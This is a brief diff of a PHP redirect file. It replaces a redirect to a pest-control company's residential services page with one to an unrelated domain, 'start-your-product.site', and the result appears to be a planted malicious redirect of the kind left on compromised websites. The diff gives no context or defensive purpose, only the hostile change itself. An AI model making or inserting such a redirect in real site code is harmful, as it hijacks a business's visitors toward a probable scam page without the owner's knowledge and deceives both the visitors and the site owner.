@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.avonpestcontrol.ca/residential-pest-control/");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
